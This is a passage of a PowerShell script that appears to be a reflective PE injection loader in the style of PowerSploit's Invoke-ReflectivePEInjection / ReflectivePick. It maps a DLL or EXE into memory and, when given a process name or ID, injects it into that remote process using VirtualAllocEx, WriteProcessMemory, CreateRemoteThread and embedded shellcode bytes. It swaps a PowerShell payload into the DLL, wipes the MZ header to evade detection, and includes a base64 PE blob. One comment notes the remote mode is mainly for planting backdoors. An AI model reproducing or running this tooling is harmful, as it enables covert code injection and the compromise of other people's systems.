        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }   
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        
        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
            write-verbose "64 Bit Injection"
        }
        else
        {
            [Byte[]]$RawBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
            write-verbose "32 Bit Injection"
        }
        #REPLACING THE CALLBACK BYTES WITH YOUR OWN
        ##############
        
        # patch in the code bytes
        $RawBytes = Invoke-PatchDll -DllBytes $RawBytes -FindString "Invoke-Replace" -ReplaceString $PoshCode
        $PEBytes = $RawBytes
        
        #replace the MZ Header
        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    Write-Verbose "PowerShell ProcessID: $PID"
    if ($ProcId)
    {
        Write-Verbose "Remote Process: $ProcID"
    }

    # REPLACE REFLECTIVEPICK DLLS HERE W/ BASE64-ENCODED VERSIONS!
    #   OR ELSE THIS SHIT WON'T WORK LOL
    $PEBytes64 = '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